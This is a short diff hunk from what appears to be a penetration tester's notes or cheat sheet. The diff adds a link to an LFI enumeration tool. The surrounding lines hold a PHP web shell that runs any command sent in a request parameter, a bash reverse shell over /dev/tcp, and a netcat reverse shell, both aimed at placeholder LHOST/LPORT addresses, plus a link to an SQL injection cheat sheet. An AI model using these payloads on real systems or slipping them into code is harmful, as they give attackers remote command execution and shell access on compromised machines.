@@ -31,6 +31,8 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 <pre><?php system($_REQUEST["yz"])?></pre><hr><form method="POST"><input type="text" id="yz" name="yz"><input type="submit" value="Submit"></form>
 
+https://github.com/mthbernardes/LFI-Enum.git
+
 bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
 
 nc -e /bin/sh LHOST LPORT
